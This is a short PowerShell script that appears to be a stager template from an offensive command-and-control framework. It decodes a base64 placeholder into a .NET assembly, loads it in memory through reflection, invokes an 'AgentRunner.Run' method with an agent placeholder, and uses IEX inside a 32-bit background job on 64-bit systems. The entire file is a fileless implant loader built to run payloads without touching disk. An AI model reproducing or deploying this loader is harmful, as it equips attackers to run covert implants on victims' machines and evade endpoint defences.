Set-StrictMode -Version 2

$alan = @'
[Byte[]]$runner = [System.Convert]::FromBase64String('%AGENT_RUNNER%')
[System.Reflection.Assembly]$assembly =  [System.Reflection.Assembly]::Load($runner)
[System.Reflection.MethodInfo]$runAgent = $assembly.GetType('DotNetAgentRunner.AgentRunner').GetMethod('Run')
$runAgent.Invoke([IntPtr]::Zero, '%AGENT%')
'@

if ([IntPtr]::size -eq 8) {
	start-job { param($a) IEX $a } -RunAs32 -Argument $alan | wait-job | Receive-job
}
else {
	IEX $alan
}